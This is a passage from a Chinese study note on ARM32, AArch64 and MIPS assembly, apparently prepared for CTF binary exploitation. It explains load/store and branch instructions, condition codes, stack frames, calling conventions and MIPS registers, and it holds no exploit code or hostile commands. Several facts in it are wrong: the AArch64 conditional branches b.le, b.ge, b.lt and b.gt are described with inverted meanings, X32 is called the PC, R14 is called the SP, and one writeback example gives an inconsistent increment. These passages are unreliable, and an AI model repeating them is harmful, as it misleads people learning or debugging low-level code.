STR</h5><p>ARM使用加载存储模型进行内存访问，这意味着只有加载/存储（LDR和STR）指令才能访问内存</p><p>通常，LDR用于将某些内容从内存加载到寄存器中，而STR用于将某些内容从寄存器存储到内存地址中</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/iasd121sd.png" alt=""></p><p>LDR操作：将R0中的地址的值加载到R2寄存器中</p><p>STR操作：将R2中的值存储到R1中的内存地址处</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/%E5%9B%BE%E7%89%876.png" alt=""></p><h5 id="LDM-和-STM"><a href="#LDM-和-STM" class="headerlink" title="LDM 和 STM"></a>LDM 和 STM</h5><p>在执行压栈和出栈的指令时，通常使用LDMIA/STMDB</p><p>但事实上在汇编的过程中，可以看到LDMIA和STMDB指令<strong>已转换为PUSH和POP</strong>，那是因为 PUSH和STMDB sp!, reglist，POP和LDMIA sp! Reglist是等价的</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/asfasdzxcvrte.png" alt=""></p><h5 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h5><p>分支指令分为三种：</p><p><strong>分支(B)</strong></p><p>​    简单跳转到功能</p><p><strong>分支链接(BL)</strong></p><p>​    将(PC + 4)保存为LR并跳转至功能</p><p><strong>分支交换(BX)和分支链接交换(BLX)</strong></p><p>与B / BL +exchange指令集相同(ARM &lt;-&gt; Thumb)</p><p>需要一个寄存器作为第一个操作数：BX / BLX reg</p><p>BX / BLX用于将指令集从ARM交换到Thumb</p><p><u>不过AARCH64中貌似去除了thumb转换指令</u></p><h5 id="指令后缀"><a href="#指令后缀" class="headerlink" title="指令后缀"></a>指令后缀</h5><div class="table-container"><table><thead><tr><th>后缀</th><th>描述</th></tr></thead><tbody><tr><td>S</td><td>更新 APSR(应用程序状态寄存器，如进位、溢出、零和负标志)，例如：<code>ADDS R0，R1;该ADD操作会更新APSR</code></td></tr><tr><td>EQ， NE， CS， CC， MI，PL，VS，VC，HI，LS，GE， LT， GT， LE</td><td>条件执行后缀，若满足相应条件则执行后面的语句，例如：<code>BEQ label;若之前的操作得到相等的状态（状态寄存器Z置位），则跳转至 label</code></td></tr><tr><td>.N，.W</td><td>指定使用的是 16 位指令 (narrow) 或 32 位指令(wide）</td></tr><tr><td>.32，.F32</td><td>指定 32 位单精度运算, 对于多数工具链, 32 后缀是可选的</td></tr><tr><td>.64，.F64</td><td>指定 64 位单精度运算, 对于多数工具链, 64 后缀是可选的</td></tr></tbody></table></div><p>可以通过 S 后缀的指令影响状态寄存器的标志位，再通过各类条件码后缀执行相应判断</p><div class="table-container"><table><thead><tr><th>条件码助记符</th><th>条件码</th><th>标志</th><th>含义</th></tr></thead><tbody><tr><td>EQ</td><td>0000</td><td>Z=1</td><td>相等</td></tr><tr><td>NE</td><td>0001</td><td>Z=0</td><td>不相等</td></tr><tr><td>CS/HS</td><td>0010</td><td>C=1</td><td>无符号数大于或等于</td></tr><tr><td>CC/LO</td><td>0011</td><td>C=0</td><td>无符号数小于</td></tr><tr><td>MI</td><td>0100</td><td>N=1</td><td>负数</td></tr><tr><td>PL</td><td>0101</td><td>N=0</td><td>正数</td></tr><tr><td>VS</td><td>0110</td><td>V=1</td><td>溢出</td></tr><tr><td>VC</td><td>0111</td><td>V=0</td><td>没有溢出</td></tr><tr><td>HI</td><td>1000</td><td>C=1，Z=0</td><td>无符号数大于</td></tr><tr><td>LS</td><td>1001</td><td>C=0 或 Z=1</td><td>无符号数小于或等于</td></tr><tr><td>GE</td><td>1010</td><td>N=V</td><td>带符号数大于或等于</td></tr><tr><td>LT</td><td>1011</td><td>N!=V</td><td>带符号数小于</td></tr><tr><td>GT</td><td>1100</td><td>Z=0，N=V</td><td>带符号数大于</td></tr><tr><td>LE</td><td>1101</td><td>Z=1 或 N!=V</td><td>带符号数小于或等于</td></tr><tr><td>AL</td><td></td><td>—</td><td>无条件执行</td></tr><tr><td>NV</td><td></td><td>—</td><td>不执行</td></tr></tbody></table></div><p>条件码应用举例：</p><p>比较两个值大小，并进行相应加1处理，C语言代码为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  ( a &gt; b )  </span><br><span class="line"></span><br><span class="line">  a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"></span><br><span class="line">  b++;</span><br></pre></td></tr></table></figure><p> 对应的ARM指令如下（其中R0中保存a 的值，R1中保存b的值）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMP R0, R1 ; R0与R1比较，做R0-R1的操作</span><br><span class="line"></span><br><span class="line">ADDHI R0, R0, #1 ;若R0 &gt; R1, 则R0 = R0 + 1</span><br><span class="line"></span><br><span class="line">ADDLS R1, R1, #1 ; 若R0 &lt;= R1, 则R1 = R1 + 1</span><br></pre></td></tr></table></figure><h5 id="ARM32与AARCH64部分指令差异"><a href="#ARM32与AARCH64部分指令差异" class="headerlink" title="ARM32与AARCH64部分指令差异"></a>ARM32与AARCH64部分指令差异</h5><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/546sfdr239.png" alt=""></p><h5 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h5><p><code>arm</code>架构下的寄存器和<code>x86_64</code>架构还是有很大区别的，其中<code>R0 ~ R3</code>是用来依次传递参数的，相当于<code>x64</code>下的<code>rdi, rsi, rdx</code>，<code>R0</code>还被用于存储函数的返回值，<code>R7</code>常用来存放系统调用号，<code>R11</code>是栈帧，相当于<code>ebp</code>，在<code>arm</code>中也被叫作<code>FP</code>，相应地，<code>R13</code>是栈顶，相当于<code>esp</code>，在<code>arm</code>中也被叫作<code>SP</code>，<code>R14(LP)</code>是用来存放函数的返回地址的，<code>R15</code>相当于<code>eip</code>，在<code>arm</code>中被叫作<code>PC</code>，但是在程序运行的过程中，<code>PC</code>存储着当前指令往后两条指令的位置，在<code>arm</code>架构中并不是像<code>x86_64</code>那样用<code>ret</code>返回，而是直接<code>pop &#123;PC&#125;</code>。</p><p>在<code>arm</code>中的<code>ldr</code>和<code>str</code>指令是必须清楚的，其中<code>ld</code>就是<code>load</code>（加载），<code>st</code>就是<code>store</code>（存储），而<code>r</code>自然就是<code>register</code>（寄存器），搞明白这些以后，这两个指令就很容易理解了（<code>cond</code>为条件）：</p><p><code>LDR &#123;cond&#125; Rd, &lt;addr&gt;</code>：加载指定地址(<code>addr</code>)上的数据(字)，放入到<code>Rd</code>寄存器中。</p><p><code>STR &#123;cond&#125; Rd, &lt;addr&gt;</code>：将<code>Rd</code>寄存器中的数据(字)存储到指定地址(<code>addr</code>)中。</p><p>当然，这两个指令有很多种写法，灵活多变：</p><p><code>str r2, [r1, #2]</code>：寄存器<code>r2</code>中的值被存放到寄存器<code>r1</code>中的地址加<code>2</code>处的地址中，<code>r1</code>寄存器中的值不变;</p><p><code>str r2, [r1, #2]!</code>：与上一条一样，不过最后<code>r1 += 4</code>，这里的<code>&#123;!&#125;</code>是可选后缀，若选用该后缀，则表示请求回写，也就是当数据传送完毕之后，将最后的地址写入到基址寄存器(<code>Rn</code>)中;</p><p><code>ldr r2, [r1], #-2</code>：将<code>r1</code>寄存器里地址中的值给<code>r2</code>寄存器，最后<code>r1 -= 2</code>；</p><p>上面的立即数或者寄存器也类似，此外还可以有这些写法：</p><p><code>str r2, [r1, r3, LSL#2]</code>：将寄存器<code>r2</code>中的值存储到寄存器<code>r1</code>中的地址加上<code>r3</code>寄存器中的值左移两位后的值所指向的地址中；</p><p><code>ldr r2, [r1], r3, LSL#2</code>：将<code>r1</code>寄存器里地址中的值给<code>r2</code>寄存器，最后<code>r1 += r3 &lt;&lt; 2</code>.</p><p>在<code>arm</code>中仍有<code>mov</code>指令，通常用于寄存器与寄存器间的数据传输，也可以传递立即数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov r1, #0x10`：`r1 = 0x10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov r1, r2`：`r1 = r2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov r1, r2, LSL#2`：`r1 = r2 &lt;&lt; 2</span><br></pre></td></tr></table></figure><p>由此可见，<code>ldr</code>和<code>str</code>指令通常用于寄存器与内存间的数据传递，其中会通过另一个寄存器作为中介，而<code>mov</code>指令则是通常用于两个寄存器之间数值的传递。</p><p>此外，还有数据块传输指令<code>LDM, STM</code>，</p><p>其中提到了<code>STMFD</code>和<code>LDMFD</code>指令，可用作压栈和弹栈，如<code>STMFD SP! ,&#123;R0-R7，LR&#125;</code>和<code>LDMFD SP! ,&#123;R0-R7，LR&#125;</code>，但是在我们拿到的<code>CTF</code>题目中，常见的仍是<code>push &#123;&#125;</code>和<code>pop &#123;&#125;</code>指令。</p><p>还需要知道的是<code>add</code>和<code>sub</code>命令：</p><p><code>add r1, r2, #2</code> 相当于 <code>r1 = r2 + 2</code>；</p><p><code>sub r1, r2, r3</code> 相当于 <code>r1 = r2 - r3</code>.</p><p>还有跳转指令<code>B</code>相关的一些指令，相当于<code>jmp</code>：</p><p><code>B Label</code>：无条件跳转到<code>Label</code>处；</p><p><code>BL Label</code>：当程序跳转到标号<code>Label</code>处执行时，同时将当前的<code>PC</code>值保存到<code>R14</code>中；</p><p><code>BX Label</code>：这里需要先提一下<code>arm</code>指令压缩形式的子集<code>Thumb</code>指令了，不像是<code>arm</code>指令是一条四个字节，<code>Thumb</code>指令一条两个字节，<code>arm</code>对应的<code>cpu</code>工作状态位为<code>0</code>，而<code>Thumb</code>对应的<code>cpu</code>工作状态位为<code>1</code>，我们从其中一个指令集跳到另外一个指令集的时候，需要同时修改其对应的<code>cpu</code>工作状态位，不然会报<code>invalid instrument</code>错误，当<code>BX</code>后面的地址值最后一个<code>bit</code>为<code>1</code>时，则转为<code>Thumb</code>模式，否则转为<code>arm</code>模式，直接<code>pop &#123;pc&#125;</code>这样跳转也有这种特性；</p><p><code>BLX Label</code>：就是<code>BL + BX</code>指令共同作用的效果。</p><p>位运算命令：<code>and orr eor</code> 分别是 按位与、或、异或。</p><h5 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h5><p><code>aarch64</code>和<code>arm</code>架构相比，还是有一些汇编指令上的区别的：</p><p>首先仍是寄存器，在<code>64</code>位下都叫作<code>Xn</code>寄存器了，其对应的低<code>32</code>位叫作<code>Wn</code>寄存器，其中栈顶是<code>X31(SP)</code>寄存器，栈帧是<code>X29(FP)</code>寄存器，<code>X0 ~ X7</code>用来依次传递参数，<code>X0</code>存放着函数返回值，<code>X8</code>常用来存放系统调用号或一些函数的返回结果，<code>X32</code>是<code>PC</code>寄存器，<code>X30</code>存放着函数的返回地址(<code>aarch64</code>中的<code>RET</code>指令返回<code>X30</code>寄存器中存放的地址)。</p><p>然后是跳转指令，仍有<code>B</code>，<code>BL</code>指令，新增了<code>BR</code>指令（向寄存器中的地址跳转），<code>BLR</code>组合指令。<br>还有一些带判断的跳转指令：<code>b.ne</code>是不等则跳转，<code>b.eq</code>是等于则跳转，<code>b.le</code>是大于则跳转，<code>b.ge</code>是小于则跳转，<code>b.lt</code>是大于等于则跳转，<code>b.gt</code>是小于等于则跳转，<code>cbz</code>为结果等于零则跳转，<code>cbnz</code>为结果非零则跳转…</p><p>在<code>aarch64</code>架构下的一大变化就是，不再使用<code>push</code>和<code>pop</code>指令压栈和弹栈了，也没有<code>LDM</code>和<code>STM</code>指令，而是使用<code>STP</code>和<code>LDP</code>指令：</p><p><code>STP x4, x5, [sp, #0x20]</code>：将<code>sp+0x20</code>处依次覆盖为<code>x4，x5</code>，即<code>x4</code>入栈到<code>sp+0x20</code>，<code>x5</code>入栈到<code>sp+0x28</code>，最后<code>sp</code>的位置不变。</p><p><code>LDP x29, x30, [sp], #0x40</code>：将<code>sp</code>弹栈到<code>x29</code>，<code>sp+0x8</code>弹栈到<code>x30</code>，最后<code>sp += 0x40</code>。</p><p>其中，<code>STP</code>和<code>LDP</code>中的<code>P</code>是<code>pair</code>（一对）的意思，也就是说，仅可以同时读/写两个寄存器。</p><h2 id="ARM堆栈和函数调用"><a href="#ARM堆栈和函数调用" class="headerlink" title="ARM堆栈和函数调用"></a>ARM堆栈和函数调用</h2><p>是一种先进后出的数据结构，栈底是第一个进栈的数据所处位置，栈顶是最后一个数据进栈所处的位置。在创建进程时会在栈中分配相应内存，我们使用堆栈来保存局部变量、参数传递、保存寄存器的值</p><p>​    ARM中主要使用PUSH和POP指令与堆栈进行交互</p><p>​    注意，这里的PUSH和POP是其他一些与内存相关的指令的别名，而不是真实的指令</p><p>四种堆栈：<strong>ARM采用的满降栈</strong></p><p>●满/空栈</p><p>根据SP指针指向的位置，栈可以分为满栈和空栈</p><p>  满栈：当堆栈指针总是指向最后压入堆栈的数据</p><p>  空栈：当堆栈指针总是指向下一个将要放入数据的空位置</p><p>●升/降栈</p><p>根据SP指针移动的方向，栈可以分为升栈和降栈</p><p>  升栈：随着数据的入栈，SP指针从低地址-&gt;高地址移动</p><p>  降栈：随着数据的入栈，SP指针从高地址-&gt;低地址移动</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cvb344asd10.png" alt=""></p><p>这是不同的栈使用的压栈/出栈(存储多个/加载多个)指令:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/sadasdas11.png" alt=""></p><h3 id="ARM栈帧"><a href="#ARM栈帧" class="headerlink" title="ARM栈帧"></a>ARM栈帧</h3><p>栈帧(stack frame)就是一个函数所使用的那部分栈，所有函数的栈帧串起来就组成了一个完整的栈。栈帧的两个边界分别由fp(r11)和sp(r13)来限定。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-03_200916.png" alt=""></p><p>​    前面描述的是ARM的栈帧布局方式。main stack frame为调用函数的栈帧，func1 stack frame为当前函数(被调用者)的栈帧，栈底在高地址，栈向下增长</p><p>​    FP就是栈基址，它指向函数的栈帧起始地址；SP则是函数的栈指针，它指向栈顶的位置。ARM压栈的顺序依次为当前函数指针PC、返回指针LR、栈指针SP、栈基址FP、传入参数个数及指针、本地变量和临时变量</p><p>​    如果函数准备调用另一个函数，跳转之前临时变量区先要保存另一个函数的参数。从main函数进入到func1函数，main函数的上边界和下边界保存在被它调用的栈帧里面。</p><p>   ARM也可以用栈基址和栈指针明确标示栈帧的位置，栈指针SP一直移动</p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>​    1、比较两个值大小, C 语言代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(a &gt; b) a++; else b++;</span><br></pre></td></tr></table></figure><p>​    对应的 ARM 指令代码如下：（设 R0 为 a，R1 为 b）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CMP R0, R1         ;R0与R1比较 </span><br><span class="line">ADDHI R0,R0,#1     ;若R0 &gt; R1，则R0 = R0 + 1 </span><br><span class="line">ADDLS R1,R1,#1     ;若R0 &lt;= R1，则R1 = R1 + 1</span><br></pre></td></tr></table></figure><p>​    2、若两个条件均成立，则将这两个数值相加，C 语言代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((a != 10)&amp;&amp;(b != 20)) a = a + b;</span><br></pre></td></tr></table></figure><p>​    对应的 ARM 指令代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CMP R0,#10     ;比较R0是否为10 </span><br><span class="line">CMPNE R1,#20   ;若R0不为10，则比较R1是否为20 </span><br><span class="line">ADDNE R0,R0,R1 ;若R0不为10且R1不为20，则执行 R0 = R0+R1</span><br></pre></td></tr></table></figure><p>​    3、若两个条件有一个成立，则将这两个数值相加，C 语言代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((a!=10)||(b!=20)) a=a+b;</span><br></pre></td></tr></table></figure><p>​    对应的 ARM 指令代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CMP R0,#10      </span><br><span class="line">CMPEQ R1,#20   </span><br><span class="line">ADDNE R0,R0,R1</span><br></pre></td></tr></table></figure><h3 id="处理器内数据传送"><a href="#处理器内数据传送" class="headerlink" title="处理器内数据传送"></a>处理器内数据传送</h3><p>以32为例</p><div class="table-container"><table><thead><tr><th>指令名称</th><th>语法</th><th>指令作用</th><th>注意</th></tr></thead><tbody><tr><td>MOV</td><td><code>MOV Rx,Ry/#num32</code></td><td>将源操作数的值赋给目的操作数</td><td></td></tr><tr><td>MRS</td><td><code>MRS Rx,Rs</code></td><td>同 MOV</td><td>源操作数应为特殊寄存器</td></tr><tr><td>MSR</td><td><code>MSR Rs,Rx</code></td><td>同 MOV</td><td>目的操作数应为特殊寄存器</td></tr><tr><td>MOVW</td><td><code>MOVW Rx,#num16</code></td><td>将源操作数赋给目的操作数的低 16 位</td><td>高位清零</td></tr><tr><td>MOVT</td><td><code>MOVT Rx,#num16</code></td><td>将源操作数赋给目的操作数的高 16 位</td><td>低位不变</td></tr></tbody></table></div><h3 id="不同数据大小的存储器访问"><a href="#不同数据大小的存储器访问" class="headerlink" title="不同数据大小的存储器访问"></a>不同数据大小的存储器访问</h3><div class="table-container"><table><thead><tr><th>数据类型</th><th>读存储器指令</th><th>写存储器指令</th><th>语法</th></tr></thead><tbody><tr><td>32 位</td><td>LDR</td><td>STR</td><td><code>LDR Rx,ADDR;将地址ADDR上的值赋给Rx</code> <code>STR Rx,ADDR;将Rx的值赋给地址为ADDR的存储空间</code></td></tr><tr><td>16 位有符号</td><td>LDRSH</td><td>无</td><td></td></tr><tr><td>16 位无符号</td><td>LDRH</td><td>STRH</td><td></td></tr><tr><td>8 位有符号</td><td>LDRSB</td><td>无</td><td></td></tr><tr><td>8 位无符号</td><td>LDRB</td><td>STRB</td><td></td></tr><tr><td>多个 32 位</td><td>LDM</td><td>STM</td><td>LDM、STM</td></tr><tr><td>双字（64 位）</td><td>LDRD</td><td>STRD</td><td><code>LDRD/STRD R1,R2,ADDR;从地址ADDR上读出两个字并分别赋给两个寄存器</code></td></tr><tr><td>栈操作（32 位）</td><td>POP</td><td>PUSH</td><td>PUSH、POP</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ldr指令的格式：</span><br><span class="line">LDR R0, [R1]</span><br><span class="line">LDR R0, =NAME</span><br><span class="line">LDR R0, =0X123</span><br><span class="line">对于第一种没有等号的情况，R1寄存器对应地址的数据被取出放入R0</span><br><span class="line">对于第二种有等号的情况，R0寄存器的值将为NAME标号对应的地址。</span><br><span class="line">对于第三种有等号的情况，R0寄存器的值将为立即数的值</span><br></pre></td></tr></table></figure><h3 id="存储器访问方式-地址表达式"><a href="#存储器访问方式-地址表达式" class="headerlink" title="存储器访问方式(地址表达式)"></a>存储器访问方式(地址表达式)</h3><h4 id="立即数偏移"><a href="#立即数偏移" class="headerlink" title="立即数偏移"></a>立即数偏移</h4><p>数据传输使用的存储器地址为：寄存器中的数值 + 立即数常量（偏移地址）</p><p><code>LDRB R0,[R1,#0x3];</code>从地址R1+0x3中读取一个字节并将其存入R0</p><p>加入感叹号（!）可更新存放地址的寄存器的值（写回）：<br><code>LDRB R0,[R1,#0x3]!;</code>从地址R1+0x3中读取一个字节并将其存入R0后令R1=R1+0x3</p><h4 id="寄存器偏移"><a href="#寄存器偏移" class="headerlink" title="寄存器偏移"></a>寄存器偏移</h4><p> 类似立即数偏移，但这里的寄存器可以通过移位指令进行移位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR R3,[R0, R2, LSL #2];将存储器[R0+(R2&lt;&lt;2)]读入R3</span><br><span class="line">LDR R3,[R0, R2];将存储器[R0+R2]读入R3</span><br></pre></td></tr></table></figure><p> 注意：这里进行的是前序偏移，也就是以地址偏移后的值为地址进行取值，下面介绍一下后序寻址：</p><p> 后序寻址是取地址上的值，后进行地址偏移：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDR R0, [R1], #offset;读取存储器[R1],然后R1被赋值为R1+偏移</span><br></pre></td></tr></table></figure><p>后序寻址不能使用 R14（SP）或 R15（PC）。</p><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><div class="table-container"><table><thead><tr><th>指令名称</th><th>语法</th><th>指令作用</th></tr></thead><tbody><tr><td>B</td><td><code>B label</code></td><td>跳转到标号对应的地址，属于相对跳转（会计算标号和当前 PC 的差），跳转范围为 ±2KB（可添加. W 后缀使用 32 位版本的指令）</td></tr><tr><td>BX</td><td><code>BX Rx</code></td><td>跳转到存放于寄存器 Rx 中的地址值，并基于 Rx 第 0 位设置处理器执行状态（Cortex-M 只支持 Thumb 状态，因此第 0 位必须为 1）</td></tr></tbody></table></div><h4 id="函数调用-1"><a href="#函数调用-1" class="headerlink" title="函数调用"></a>函数调用</h4><div class="table-container"><table><thead><tr><th>指令名称</th><th>语法</th><th>指令作用</th></tr></thead><tbody><tr><td>BL</td><td><code>BL label</code></td><td>跳转到标号位置并将返回地址保存到链接寄存器 R14（LR）中</td></tr><tr><td>BLX</td><td><code>BLX Rx</code></td><td>跳转到存放于寄存器 Rx 中的地址值并将返回地址保存到 LR 中，以及更新 EPSR 中的 T 位为 Rx 的最低位</td></tr></tbody></table></div><p>程序计数器 R15（PC）为跳转目标地址（即将标号 / 地址赋给 PC）<br>返回地址即 BL/BLX 指令后的指令的地址<br>由于 Cortex-M 只支持 Thumb 状态，因此使用 BLX 指令时，Rx 的第 0 位必须为 1</p><p>函数调用和标号跳转的区别在于，函数调用需要将返回地址保存，这也是 BL 和 BLX 与 B 和 BX 的区别</p><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="AAPCS"><a href="#AAPCS" class="headerlink" title="AAPCS"></a>AAPCS</h3><p>在较早之前,ARM过程调用标准叫做 <code>APCS</code> (ARM Procedure Call Standard)，</p><p>Thumb 的过程调用标准为 <code>TPCS</code>。</p><p>如今这两种叫法已经废弃，统一称作 <code>AAPCS</code> (Procedure Call Standard for the ARM Architecture)。</p><h3 id="thumb-amp-arm"><a href="#thumb-amp-arm" class="headerlink" title="thumb&amp;arm"></a>thumb&amp;arm</h3><p>ARM架构有两种指令编码:ARM and THUMB</p><p>ARM指令集使用32位指令(不论32位还是64位)，而Thumb指令集使用16位指令，旨在提高代码密度，降低存储和带宽要求。在ARM体系结构中，处理器可以在ARM和Thumb指令之间切换执行。</p><div class="table-container"><table><thead><tr><th></th><th>Thumb 状态</th><th>ARM 状态</th></tr></thead><tbody><tr><td>指令集</td><td>Thumb 指令集</td><td>ARM 指令集</td></tr><tr><td>指令长度</td><td>16 位（半字指令）</td><td>32 位</td></tr><tr><td>指令执行条件</td><td>大多数指令无条件执行</td><td>大多数指令有条件执行</td></tr><tr><td>优点</td><td>低功耗，存储空间要求低</td><td>代码需要的指令数少，性能高</td></tr></tbody></table></div><h3 id="EABI"><a href="#EABI" class="headerlink" title="EABI"></a>EABI</h3><p>EABI是嵌入式应用二进制接口（Embedded Application Binary Interface）。ARM EABI是一种与ARM架构相关的二进制接口标准，旨在确保在嵌入式系统中编写的软件的二进制兼容性。</p><p>EABI定义了一组规范，涉及到函数调用规约、数据对齐、异常处理、堆栈管理等方面。这有助于确保在不同的编译器、操作系统和库之间生成的二进制程序可以在ARM架构的嵌入式系统上正确运行</p><h3 id="el-amp-hf"><a href="#el-amp-hf" class="headerlink" title="el&amp;hf"></a>el&amp;hf</h3><p><strong>armel</strong>是arm eabi little endian的缩写</p><p><strong>armhf</strong>是arm hard float的缩写</p><p><strong>arm64</strong>,64位的arm默认就是hf的，因此不需要hf的后缀。</p><p><strong>armel和armhf的区别</strong></p><p>它们的区别<u>体现在浮点运算</u>上，它们在进行浮点运算时都会使用fpu，<strong>但是armel传参数用普通寄存器</strong>，<strong>而armhf传参数用的是fpu的寄存器</strong>，因此armhf的浮点运算性能更高。</p><hr><h1 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>mips是大端(big-endian)架构，而mipsel是小端(little-endian)架构。指令的用法是差不多的。</li><li>MIPS固定4字节指令长度；</li><li>内存中的数据访问（load/store）必须严格对其（至少4字节对齐）；</li><li>跳转指令只有26位目标地址，加上2位对齐位，可寻址28位的空间，即256MB；</li><li>条件分支指令只有16位跳转地址，加上2位对齐位，可寻址18位的空间，即256KB；</li><li><strong>流水线效应</strong>。MIPS采用了高度的流水线，其中最重要的就是分支延迟效应。在分支跳转语句后面那条语句叫分支延迟槽。实际上，在程序执行到分支语句时，当他刚把要跳转的地址填充好（填充到代码计数器里），还没有完成本条指令时，分支语句后面的那个指令就已经执行了，其原因就是流水线效应——几条指令同时执行，只是处于不同的阶段，mips不像其它架构那样存在流水线阻塞。所以分支跳转语句的下一条指令通常都是空指令nop或一些其他有用的语句。</li><li>缓存刷新机制：MIPS CPUs有两个独立的cache:指令cache和数据cache。 指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush, 将数据写回到主内存。攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中。当payload触发漏洞， 劫持程序执行流程的时候，会去执行内存中的shellcode.如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。(通常执行sleep(1)刷新)</li></ul><h2 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h2><p>MIPS无论是32位还是64位都有32个通用寄存器,以及2个特殊的寄存器(hi、lo)用于保存乘法和除法指令的结果，还有一个计数寄存器pc。</p><p>寄存器分为两类：通用寄存器（GPR）和特殊寄存器。通用寄存器：MIPS体系结构中有32个通用寄存器，汇编程序中用$0~$31表示。也可以用名称表示，如$sp、$t1、$ra等。</p><div class="table-container"><table><thead><tr><th style="text-align:left">编号</th><th style="text-align:left">寄存器名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">$0</td><td style="text-align:left">$zero</td><td style="text-align:left">第0号寄存器，其值始终为0。</td></tr><tr><td style="text-align:left">$1</td><td style="text-align:left">$at</td><td style="text-align:left">保留寄存器</td></tr><tr><td style="text-align:left">$2-$3</td><td style="text-align:left">$v0-$v1</td><td style="text-align:left">values，保存表达式或函数返回结果</td></tr><tr><td style="text-align:left">$4-$7</td><td style="text-align:left">$a0-$a3</td><td style="text-align:left">argument，作为函数的前四个参数</td></tr><tr><td style="text-align:left">$8-$15</td><td style="text-align:left">$t0-$t7</td><td style="text-align:left">temporaries，供汇编程序使用的临时寄存器</td></tr><tr><td style="text-align:left">$16-$23</td><td style="text-align:left">$s0-$s7</td><td style="text-align:left">saved values，子函数使用时需先保存原寄存器的值</td></tr><tr><td style="text-align:left">$24-$25</td><td style="text-align:left">$t8-$t9</td><td style="text-align:left">temporaries，供汇编程序使用的临时寄存器，补充$t0-$t7。</td></tr><tr><td style="text-align:left">$26-$27</td><td style="text-align:left">$k0-$k1</td><td style="text-align:left">保留，中断处理函数使用</td></tr><tr><td style="text-align:left">$28</td><td style="text-align:left">$gp</td><td style="text-align:left">global pointer，全局指针</td></tr><tr><td style="text-align:left">$29</td><td style="text-align:left">$sp</td><td style="text-align:left">stack pointer，堆栈指针，指向堆栈的栈顶</td></tr><tr><td style="text-align:left">$30</td><td style="text-align:left">$fp</td><td style="text-align:left">frame pointer，保存栈指针</td></tr><tr><td style="text-align:left">$31</td><td style="text-align:left">$ra</td><td style="text-align:left">return address，返回地址</td></tr></tbody></table></div><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>MISP的函数调用约定：<code>$a0~$a3</code> 用于函数前四个参数传参，多的参数用堆栈传参。<code>$v0~$v1</code>用于保存函数返回值。$fp寄存器可以理解为x86下的ebp</p><p><img src="https://toleleyjl.github.io/images/%E5%BC%82%E6%9E%84Pwn/pic10.png" alt=""></p><p>MIPS O32调用约定规定了执行跳转(调用)指令时，将返回值存储在ra寄存器。所占空间不大于4 byte的参数应该放在从 a0到 a3 的寄存器中，剩下的参数应该依次放到调用者 stack frame 的参数域中，并且在参数域中需要为前四个参数保留栈空间，因为被调用者使用到前四个参数时，是统一的将参数寄存器中的值放入保留的栈空间，再从保留的栈空间里面取值；如果被调用者需要使用 $s0~$s7 这些保留寄存器(saved 